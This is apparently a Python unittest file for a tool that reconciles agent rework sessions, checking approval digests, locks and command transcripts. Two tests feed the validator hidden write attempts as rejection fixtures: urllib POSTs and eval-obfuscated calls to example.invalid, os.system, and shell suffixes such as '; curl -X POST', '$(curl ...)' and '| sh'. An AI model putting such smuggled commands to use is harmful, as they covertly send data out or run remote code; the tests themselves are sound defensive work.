"""Synthetic original receipts and real local leases; no model/network/graph."""
import copy
import contextlib
import io
import json
import os
from pathlib import Path
import shlex
import sys
import unittest
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import test_campaign_parallel as parallel
from tools import campaign_rework_completion as completion, campaign_rework as rework
from tools import campaign_supervision as supervision, campaign_dispatch as dispatch, extract_campaign as ec
from utils import extraction_quality as quality, process_receipts as receipts


class ReworkCompletionTests(unittest.TestCase):
    setUpBase, tearDown = parallel.ParallelCampaignTests.setUp, parallel.ParallelCampaignTests.tearDown
    claim, finish = parallel.ParallelCampaignTests.claim, parallel.ParallelCampaignTests.finish

    def setUp(self):
        self.setUpBase()
        self.c['batch'] = 1
        ec.save(self.d, self.c)
        claimed = self.claim('m', 1)
        self.bid = claimed['batch']
        self.finish(self.bid)
        self.c = ec.load(self.d)
        self.c['dispatch'] = {'state': 'draining', 'id': 'synthetic-drain'}
        self.batch = ec.find_batch(self.c, self.bid)
        self.batch['cost'] = {'note': 'Original unavailable cost; keep unchanged.'}
        ec.save(self.d, self.c)
        self.root1 = ec.supervisor_dir(self.d, 'm', 1)
        self.root1.mkdir(parents=True)
        self.sid = 'original-owner-session'
        supervision.bind_slot_session(self.d, 'm', 1, self.sid)
        self.c = ec.load(self.d)
        self.job = self.root1 / 'quality-reworks' / 'original-job'
        self.job.mkdir(parents=True)
        self.audit = self.d / 'audit' / 'synthetic-rework'
        self.final, self.baseline = self.audit / 'final', self.audit / 'baseline'
        self.final.mkdir(parents=True)
        self.baseline.mkdir()
        self.entry = completion._entry()
        self.previous_events = self.root1 / 'original.events.jsonl'
        self.count_helper = self.root / 'count.py'
        self.cost_receipt = self.d / 'audit' / (self.bid + '-cost.log')
        self.cost_receipt.write_text(json.dumps({'batch': self.bid, 'cost': self.batch['cost']}))
        self.write_count_helper()
        cost = shlex.join([self.entry, 'campaign', 'cost', '--id', self.c['id'], '--batch', self.bid,
                           '--note', self.batch['cost']['note']]) + ' > ' + str(self.cost_receipt) + ' 2>&1'
        report = self.d / 'audit' / (self.bid + '-report.md')
        shell = ('set -e\n' + cost + '\n' + shlex.join([self.entry, 'campaign', 'report', '--id', self.c['id']])
                 + ' > ' + str(report) + ' 2>&1\npython3 ' + str(self.count_helper) + ' count.json\n'
                 + "python3 - <<'PY'\nfrom pathlib import Path\n"
                 + f"p=Path({str(self.d)!r});print('COST', (p/{str(self.cost_receipt.relative_to(self.d))!r}).read_text());print('REPORT\\n'+(p/{str(report.relative_to(self.d))!r}).read_text())\nPY")
        self.previous_rows = self.command_rows('original-cost', '/bin/zsh -lc ' + shlex.quote(shell),
            'COST ' + self.cost_receipt.read_text() + '\nREPORT\noriginal report', 0)
        self.previous_events.write_text(self.transcript(self.previous_rows))
        receipts.write(self.job / 'previous-worker.json', {'session': self.sid, 'events': str(self.previous_events)})
        receipts.write(self.job / 'previous-native.json', {'state': 'completed', 'exit_code': 0,
                       'attempt': 'original-production-attempt', 'ended_at': '2026-01-01T00:01:00+00:00'})
        self.assignment = self.job / 'assignment.md'
        self.assignment.write_text('Review this submitted source, preserve facts and write separate cost audit.')
        receipts.write(self.job / 'scope.json', {'campaign': self.c['id'], 'model': 'm', 'slot': 1,
                       'session': self.sid, 'batches': [self.bid], 'new_source_quota': 0,
                       'assignment': completion._ref(self.assignment)})
        self.event = self.job / 'events.jsonl'
        wrapper = "python3 - <<'PY'\n" + completion.cost_note_script(self.d, self.audit, self.bid, ' Rework cost remains unknown.').rstrip() + '\nPY'
        self.rows = self.command_rows('cost-denied', '/bin/zsh -lc ' + shlex.quote(wrapper),
                                    'cost exit 1  ' + completion.MESSAGE + '\n\n', 1)
        self.write_events()
        receipts.write(self.job / 'exit-status.json', {'exit_code': 0, 'session': self.sid,
                       'ended_at': '2026-01-01T00:03:00+00:00'})
        with receipts.attempt(self.root1 / 'native', kind='native_cli') as update:
            update(exit_code=0)
        native = receipts.read(self.root1 / 'native/latest.json')
        native.update(started_at='2026-01-01T00:02:00+00:00', ended_at='2026-01-01T00:03:00+00:00')
        receipts.write(self.root1 / 'native/latest.json', native)
        with receipts.attempt(self.root1, kind='quality_rework', identity={'campaign': self.c['id'], 'model': 'm', 'slot': 1}) as update:
            update(exit_code=2)
        supervisor = receipts.read(self.root1 / 'latest.json')
        supervisor.update(session=self.sid, batches=[self.bid], events=str(self.event), phase='coordinator_required',
                          started_at='2026-01-01T00:02:00+00:00', ended_at='2026-01-01T00:03:00+00:00')
        receipts.write(self.root1 / 'latest.json', supervisor)
        receipts.write(self.root1 / 'worker.json', {'session': self.sid, 'events': str(self.event),
                       'mode': 'quality_rework', 'batches': [self.bid]})
        with receipts.attempt(self.d / 'operations' / self.bid, kind='submit') as update:
            update(exit_code=0)
        self.write_quality()
        self.spec_file, self.plan = self.root / 'evidence.json', self.root / 'preview.json'
        self.spec = {'session': self.sid, 'model': 'm', 'audit_run': str(self.audit / 'audit-run.json'),
                     'cost_anchor_event': 'original-cost', 'cost_anchor_receipt': str(self.cost_receipt),
                     'cost_count_helper': completion._ref(self.count_helper)}
        receipts.write(self.spec_file, self.spec)

    def command_rows(self, key, command, output, code):
        item = {'id': key, 'type': 'command_execution', 'command': command}
        return [{'type': 'item.started', 'item': item}, {'type': 'item.completed',
                'item': dict(item, aggregated_output=output, exit_code=code)}]

    def transcript(self, rows):
        return ''.join(json.dumps(x) + '\n' for x in [{'type': 'thread.started', 'thread_id': self.sid},
                      *rows, {'type': 'item.completed', 'item': {'id': 'final-report', 'type': 'agent_message',
                               'text': json.dumps({'recovery_kind': 'business_permission_denied'})}}, {'type': 'turn.completed'}])

    def write_events(self):
        self.event.write_text(self.transcript(self.rows))

    def write_count_helper(self):
        # Historical standalone local counting shape, with synthetic identity.
        self.count_helper.write_text(f'''import json,datetime,sys
from pathlib import Path
P=Path({str(self.d)!r});c=json.loads((P/'campaign.json').read_text());batches={{b['id']:b for b in c['batches'] if b['model']=='m' and b.get('status')!='released'}};last={{}}
for l in (P/'log.jsonl').read_text().splitlines():
 d=json.loads(l)
 if d.get('batch') in batches and d.get('id') is not None and d.get('status') in ['ok','empty','error']:
  last[(d['batch'],d['id'])]=d
ok=sum(d.get('status')=='ok' and d.get('http')==200 for d in last.values());empty=sum(d.get('status')=='empty' and d.get('http')==200 and d.get('empty_recorded') is True for d in last.values());out=dict(model='m',ok=ok,empty=empty,success=ok+empty,method='formal log latest(batch,id), exclude released; ok HTTP200; empty HTTP200 and empty_recorded=true',at=datetime.datetime.now(datetime.timezone.utc).isoformat())
if len(sys.argv)>1:(P/'audit'/sys.argv[1]).write_text(json.dumps(out,ensure_ascii=False,indent=2)+'\\n')
print(json.dumps(out,ensure_ascii=False))
''')

    def write_quality(self):
        batch = receipts.read(self.d / 'batches' / (self.bid + '.json'))
        oid = batch['items'][0]['id']
        results = {'items': [{'id': oid, 'entities': [], 'edges': []}]}
        prompt = (self.d / 'prompt.md').read_text()
        review = quality.review_sheet(batch, results, prompt, quality.extraction_identity('m', 'codex', self.c['models']['m']['run_id']))
        review['reviewer'] = 'synthetic fixture reviewer'
        row = review['items'][0]
        row.update(verdict='ok', translation_complete=True, facts_complete=True, core_covered=True, ownership_checked=True,
                   empty={'reason': 'no_stable_knowledge', 'quote': batch['items'][0]['episode_body'], 'no_new_information': True})
        self.assertEqual(quality.validate_review(batch, results, review, prompt), [])
        (self.d / 'results' / (self.bid + '.json')).write_text(json.dumps(results))
        (self.d / 'reviews').mkdir(exist_ok=True)
        original_quality = self.d / 'reviews' / (self.bid + '.sheet.json')
        original_quality.write_text(json.dumps(review))
        values = {'batch.json': batch, 'effective-results.json': results, 'quality.json': review,
                  'quality-check.json': {'ok': True, 'errors': []}, 'source-decision-index.json': {},
                  'repair-status-index.json': {'new_requests': [], 'prior_requests': []}, 'original-integrity.json': {},
                  'review-history.json': {}, 'global-metadata-limitations.json': {'state': 'unverified'},
                  'business-permission-denial.json': {}, 'rework-cost.json': {'credits': None, 'tokens': None, 'seconds': None}}
        for name, value in values.items():
            receipts.write(self.final / name, value)
        (self.final / 'prompt-c13.txt').write_text(prompt)
        (self.final / 'decisions').mkdir()
        decision = self.final / 'decisions' / (str(oid) + '.json')
        receipts.write(decision, row)
        receipts.write(self.final / 'source-decision-index.json', {'sources': [{'id': oid, 'final_decision': completion._ref(decision)}]})
        (self.final / 'cost-command.stdout.log').write_text('')
        (self.final / 'cost-command.stderr.log').write_text(completion.MESSAGE + '\n')
        receipts.write(self.final / 'business-permission-denial.json', {'exit_code': 1, 'reason': completion.MESSAGE,
                       'retry_count': 0, 'alternate_entry_attempted': False,
                       'stdout': completion._ref(self.final / 'cost-command.stdout.log'),
                       'stderr': completion._ref(self.final / 'cost-command.stderr.log')})
        index = {}
        for key, src in [('batch', self.d / 'batches' / (self.bid + '.json')),
                         ('results', self.d / 'results' / (self.bid + '.json')),
                         ('quality', original_quality), ('prompt_c13', self.d / 'prompt.md')]:
            dst = self.baseline / (key + src.suffix)
            dst.write_bytes(src.read_bytes())
            index[key] = {'original': str(src), 'snapshot': str(dst), 'sha256': completion._ref(src)['sha256']}
        receipts.write(self.baseline / 'input-index.json', index)
        receipts.write(self.final / 'freeze-manifest.json', {'files': {
            p.name: completion._ref(p)['sha256'] for p in self.final.iterdir() if p.is_file()}})
        receipts.write(self.audit / 'audit-run.json', {'campaign': self.c['id'], 'batch': self.bid, 'model': 'm',
                       'source_count': 1, 'final_reviewed': 1, 'new_campaign_sources': 0, 'remaining_ids': [],
                       'inflight_nas_or_repair': False, 'native_session': self.sid})

    def preview(self):
        return completion.preview(self.c['id'], 'm', 1, evidence_file=self.spec_file,
                                  reason='Review original cost-note-only terminal', out=self.plan)

    def apply(self, plan=None):
        plan = plan or receipts.read(self.plan)
        return completion.apply(self.c['id'], plan_file=self.plan, confirm=plan['sha256'],
                                reviewer='explicit coordinator', reason='Reviewed all commands, closures, and unchanged original costs')

    def test_reviewed_terminal_is_append_only_and_repeat_apply_is_idempotent(self):
        paths = [self.event, self.root1 / 'native/latest.json', self.root1 / 'latest.json', self.root1 / 'worker.json']
        before = {p: p.read_bytes() for p in paths}
        with self.assertRaisesRegex(ValueError, 'terminal'):
            dispatch.resume(self.c['id'], reason='cannot skip actual refusal')
        plan = self.preview()
        result = self.apply(plan)
        self.assertEqual(self.apply(plan), result)
        self.assertEqual(result['original_public_exit_code'], 2)
        self.assertFalse(result['rejected_cost_retried'])
        self.assertFalse(result['dispatch_resumed'])
        self.assertEqual(result['semantic_acceptance'], 'not_granted')
        self.assertTrue(completion.valid(ec.load(self.d), self.d, 'm', 1))
        self.assertEqual({p: p.read_bytes() for p in paths}, before)
        self.assertEqual(ec.load(self.d)['dispatch']['state'], 'draining')

    def test_public_same_session_rework_can_follow_disposition_and_consumes_it(self):
        self.preview();self.apply()
        seen = []
        def spawn(args, **kwargs):
            seen.append(args)
            self.assertEqual(args[args.index('resume') + 1], self.sid)
            self.assertEqual(json.loads(kwargs['env']['KG_HUB_REWORK_BATCHES']), [self.bid])
            self.assertIn('rework-cost.json', args[-1])
            self.assertNotIn('一批提交并完成随机复查、成本记录后再领取下一批', args[-1])
            with receipts.attempt(self.root1 / 'native', kind='native_cli') as update:
                kwargs['stdout'].write((json.dumps({'type': 'thread.started', 'thread_id': self.sid}) + '\n'
                                        + json.dumps({'type': 'turn.completed'}) + '\n').encode())
                kwargs['stdout'].flush();update(exit_code=0)
            return mock.Mock(wait=lambda: 0)
        out = rework.run(self.c['id'], 'm', 1, batches=[self.bid], assignment=self.assignment,
                         reason='same owner final handoff only', spawn=spawn, preflight=lambda *a: {'ok': True})
        self.assertEqual(out['state'], 'rework_turn_completed')
        self.assertEqual(len(seen), 1)
        self.assertFalse(completion.valid(ec.load(self.d), self.d, 'm', 1))
        self.assertEqual(ec.find_batch(ec.load(self.d), self.bid)['cost'], self.batch['cost'])

    def test_production_supervisor_can_reuse_original_session_after_separate_dispatch_resume(self):
        self.preview();self.apply()
        dispatch.resume(self.c['id'], reason='separate coordinator source acceptance and original quota continuation')
        seen = []
        def spawn(args, **kwargs):
            seen.append(args)
            self.assertEqual(args[args.index('resume') + 1], self.sid)
            with receipts.attempt(self.root1 / 'native', kind='native_cli') as update:
                kwargs['stdout'].write((json.dumps({'type': 'thread.started', 'thread_id': self.sid}) + '\n'
                                        + json.dumps({'type': 'turn.completed'}) + '\n').encode())
                kwargs['stdout'].flush();update(exit_code=0)
            # Synthetic coordinator requests drain after observing one start.
            c = ec.load(self.d);c['dispatch']['state'] = 'draining';ec.save(self.d, c)
            return mock.Mock(wait=lambda: 0, poll=lambda: 0)
        out = supervision.run(self.c['id'], 'm', slot=1, spawn=spawn, poll=.001, sleep=lambda _: None,
                              preflight=lambda *a: {'ok': True})
        self.assertEqual(out['state'], 'drained')
        self.assertEqual(len(seen), 1)
        self.assertFalse(completion.valid(ec.load(self.d), self.d, 'm', 1))

    def test_live_target_locks_block_but_other_model_rework_may_continue(self):
        for root in [self.root1, self.root1 / 'native', self.d / 'operations' / self.bid]:
            previous = (root / 'latest.json').read_bytes()
            original = receipts.read(root / 'latest.json')
            with receipts.attempt(root, kind=original['kind'], identity=original.get('identity')):
                with self.assertRaises(receipts.Busy):self.preview()
            (root / 'latest.json').write_bytes(previous)

    def test_other_slot_lease_does_not_prevent_scoped_preview(self):
        with receipts.attempt(ec.supervisor_dir(self.d, 'n', 1), kind='quality_rework'):
            self.assertEqual(self.preview()['evidence']['batch'], self.bid)

    def test_changed_cost_cannot_be_blessed_using_after_the_fact_snapshot(self):
        c = ec.load(self.d);ec.find_batch(c, self.bid)['cost']['note'] = 'overwritten';ec.save(self.d, c)
        with self.assertRaisesRegex(ValueError, 'cost.*differ'):
            self.preview()

    def test_changed_preview_input_original_source_or_native_attempt_rejects(self):
        plan = self.preview()
        original = self.spec_file.read_bytes()
        self.spec_file.write_text(original.decode() + ' ')
        with self.assertRaisesRegex(ValueError, 'evidence changed'):self.apply(plan)
        self.spec_file.write_bytes(original)
        self.apply(plan)
        native = receipts.read(self.root1 / 'native/latest.json');native['attempt'] = 'new-attempt'
        receipts.write(self.root1 / 'native/latest.json', native)
        self.assertFalse(completion.valid(ec.load(self.d), self.d, 'm', 1))

    def test_approval_digest_and_worker_identity_are_mandatory(self):
        plan = self.preview()
        with self.assertRaisesRegex(ValueError, 'digest'):
            completion.apply(self.c['id'], plan_file=self.plan, confirm='wrong', reviewer='coordinator', reason='explicit')
        with self.assertRaisesRegex(ValueError, 'reviewer'):
            completion.apply(self.c['id'], plan_file=self.plan, confirm=plan['sha256'], reviewer='', reason='explicit')
        worker = receipts.read(self.root1 / 'worker.json');worker['session'] = 'other-session'
        receipts.write(self.root1 / 'worker.json', worker)
        with self.assertRaisesRegex(ValueError, 'original'):self.apply(plan)

    def test_cost_wrapper_extra_calls_flags_and_shell_are_rejected(self):
        command = self.rows[0]['item']['command']
        original = completion._shell(command)
        for bad in [original.replace("'--note',note", "'--tokens','9','--note',note"),
                    original.replace('capture_output=True', 'shell=True,capture_output=True'),
                    original.replace('import json,pathlib,subprocess', 'import json,pathlib,subprocess,urllib.request'),
                    original + '\npython3 -c "print(1)"']:
            with self.subTest(bad=bad[-80:]):
                with self.assertRaises((ValueError, SyntaxError)):
                    completion._cost_command('/bin/zsh -lc ' + shlex.quote(bad), self.d, self.audit, self.bid)

    def test_printed_cost_line_is_not_an_executed_original_anchor(self):
        cost_line = completion._shell(self.previous_rows[0]['item']['command']).splitlines()[1]
        fake = "cat <<'NOT_EXECUTED'\n" + cost_line + "\nNOT_EXECUTED\nprintf '%s\\n' " + shlex.quote('COST ' + self.cost_receipt.read_text())
        for row in self.previous_rows:row['item']['command'] = '/bin/zsh -lc ' + shlex.quote(fake)
        self.previous_events.write_text(self.transcript(self.previous_rows))
        with self.assertRaisesRegex(ValueError, 'complete original set-e'):
            self.preview()

    def test_hidden_post_or_subprocess_write_is_not_a_local_keyerror(self):
        scripts = ["import urllib.request\nurllib.request.urlopen('http://example.invalid/write',data=b'x')\nraise KeyError('after write')",
                   "import subprocess\nsubprocess.run(['extract','repair','apply','--file','x'])\nraise KeyError('after write')",
                   "__import__('os').system('echo unsafe')\nraise KeyError('after write')",
                   "Path=eval\nPath(\"__import__('urllib.request',fromlist=['']).urlopen('http://example.invalid/write',data=b'x')\")\nprint({}['missing'])"]
        for source in scripts:
            row = {'id': 'unknown-write', 'exit_code': 1, 'command': "python3 - <<'PY'\n" + source + '\nPY',
                   'output': 'Traceback (most recent call last):\nKeyError: after write\n'}
            with self.subTest(source=source):
                with self.assertRaises(ValueError):completion._diagnostic(row, {}, self.d)

    def test_compound_public_diagnostic_cannot_hide_a_second_write(self):
        for suffix in ['; curl -X POST http://example.invalid/write', ' && curl http://example.invalid',
                       '$(curl http://example.invalid)', ' | sh']:
            command = (self.entry + ' agent quality-check --batch /private/tmp/batch.json --file /private/tmp/result.json'
                       ' --prompt-file /private/tmp/prompt.txt --review /private/tmp/review.json' + suffix)
            row = {'id': 'compound', 'exit_code': 1, 'command': command,
                   'output': 'Traceback (most recent call last):\nKeyError: after write\n'}
            with self.subTest(suffix=suffix):
                with self.assertRaises(ValueError):completion._diagnostic(row, {}, self.d)

    def test_zero_shell_exit_does_not_clear_nested_permission_or_unknown_write(self):
        for output in [completion.MESSAGE, 'PermissionError: denied', '{"http":403,"status":"error"}',
                       '{"exit_code":75}', '{"state":"uncertain","may_have_written":true}']:
            self.rows += self.command_rows('masked-operation', 'python3 -c "print(1)"', output, 0)
            self.write_events()
            with self.subTest(output=output):
                with self.assertRaisesRegex(ValueError, 'masked'):self.preview()
            self.rows = self.rows[:-2]

    def test_quoted_historical_permission_text_is_not_an_operation_refusal(self):
        output = json.dumps({'snapshot': {'episode': {'content': 'Historical PermissionError is observation data.'}}})
        self.rows += self.command_rows('read-source', 'python3 -c "print(1)"', output, 0)
        self.write_events()
        self.assertEqual(self.preview()['evidence']['batch'], self.bid)

    def test_public_cli_requires_exact_preview_and_explicit_apply_approval(self):
        args = ['reconcile-rework-completion', '--id', self.c['id'], '--preview', '--model', 'm', '--slot', '1',
                '--evidence', str(self.spec_file), '--out', str(self.plan), '--reason', 'explicit read-only preview']
        with mock.patch('sys.stdout'):
            self.assertEqual(ec._main(args), 0)
        plan = receipts.read(self.plan)
        with mock.patch('sys.stdout'):
            self.assertEqual(ec._main(['reconcile-rework-completion', '--id', self.c['id'], '--apply', str(self.plan),
                '--confirm-plan-sha', plan['sha256'], '--reviewer', 'coordinator', '--reason', 'reviewed exact plan']), 0)
        self.assertTrue(completion.valid(ec.load(self.d), self.d, 'm', 1))

    def test_public_preview_stdout_is_one_parseable_json_document(self):
        expected = {'kind': completion.KIND, 'sha256': 'synthetic-plan-sha', 'scope': '原会话交接'}
        output = io.StringIO()
        with mock.patch.object(completion, 'preview', return_value=expected) as operation, contextlib.redirect_stdout(output):
            code = ec._main(['reconcile-rework-completion', '--id', 'synthetic-campaign', '--preview',
                '--model', 'synthetic-model', '--slot', '1', '--evidence', '/private/tmp/synthetic-evidence.json',
                '--out', '/private/tmp/synthetic-plan.json', '--reason', 'explicit reviewed scope'])
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(output.getvalue()), expected)
        operation.assert_called_once_with('synthetic-campaign', 'synthetic-model', 1,
            evidence_file=Path('/private/tmp/synthetic-evidence.json'), reason='explicit reviewed scope',
            out=Path('/private/tmp/synthetic-plan.json'))

    def test_public_apply_stdout_is_one_parseable_json_document(self):
        expected = {'kind': completion.KIND, 'original_public_exit_code': 2, 'rejected_cost_retried': False}
        output = io.StringIO()
        with mock.patch.object(completion, 'apply', return_value=expected) as operation, contextlib.redirect_stdout(output):
            code = ec._main(['reconcile-rework-completion', '--id', 'synthetic-campaign', '--apply',
                '/private/tmp/synthetic-plan.json', '--confirm-plan-sha', 'synthetic-plan-sha',
                '--reviewer', 'synthetic-coordinator', '--reason', 'explicit reviewed scope'])
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(output.getvalue()), expected)
        operation.assert_called_once_with('synthetic-campaign', plan_file=Path('/private/tmp/synthetic-plan.json'),
            confirm='synthetic-plan-sha', reviewer='synthetic-coordinator', reason='explicit reviewed scope')

    def test_no_commands_after_terminal_and_no_unfinished_or_additional_refusal(self):
        self.event.write_text(self.transcript([]) + ''.join(json.dumps(x) + '\n' for x in self.rows))
        with self.assertRaisesRegex(ValueError, 'follow.*terminal'):self.preview()
        self.write_events()
        self.rows.insert(0, self.command_rows('unfinished', 'rg x', '', 0)[0]);self.write_events()
        with self.assertRaisesRegex(ValueError, 'fully completed'):self.preview()
        self.rows.pop(0)
        self.rows += self.command_rows('other-refusal', 'rg x', 'PermissionError: access denied', 1)
        self.write_events()
        with self.assertRaisesRegex(ValueError, 'other real refusals'):self.preview()

    def test_original_cost_guard_and_separate_rework_prompt_remain(self):
        with mock.patch.dict(os.environ, {'KG_HUB_REWORK_BATCHES': json.dumps([self.bid])}):
            with self.assertRaisesRegex(SystemExit, 'quality rework cannot'):
                ec._main(['cost', '--id', self.c['id'], '--batch', self.bid, '--note', 'still forbidden'])
        with mock.patch.object(ec, 'brief', side_effect=AssertionError('production brief must not be inherited')):
            text = supervision.native_args(ec.load(self.d), 'm', self.sid, 1, quality_rework=True)[-1]
        self.assertIn('rework-cost.json', text)
        self.assertIn('新增来源配额为0', text)
        self.assertIn('null', text)


if __name__ == '__main__':unittest.main()
